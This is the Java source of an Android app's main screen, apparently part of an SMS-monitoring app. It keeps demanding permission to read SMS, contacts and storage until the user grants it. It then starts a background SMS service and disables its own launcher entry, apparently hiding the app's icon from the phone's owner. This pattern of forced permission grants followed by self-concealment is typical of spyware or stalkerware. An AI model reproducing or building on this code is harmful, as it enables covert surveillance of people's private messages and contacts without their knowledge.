package com.jerrol.app.smsobserver;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

/**
 * Created by Jerrol on 5/7/2017.
 */

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static final int REQUEST_CODE_PERMISSION = 1;

    private static final String[] PERMISSIONS = { Manifest.permission.READ_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermission();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case 1:
                if(!checkAllPermisionsGranted(getApplicationContext(), PERMISSIONS)) {
                    requestPermission();
                } else {
                    Log.i(TAG, "grantsResult: " + grantResults.length);
                    Log.i(TAG, "permissions: " + permissions.length);
                    Intent i = new Intent(this, SMSService.class);
                    this.startService(i);
                    PackageManager packageManager = getPackageManager();
                    packageManager.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                    finish();
                }
                break;
        }
    }

    private void requestPermission() {
        ActivityCompat.requestPermissions(this, PERMISSIONS, REQUEST_CODE_PERMISSION);
    }

    private boolean checkAllPermisionsGranted(Context context, String[] permissions) {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            for (String permission : permissions) {
                if(ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }

        return true;
    }

    @Override
    protected void onDestroy() {
        Log.i(TAG, "onDestroy called");
        super.onDestroy();
    }
}
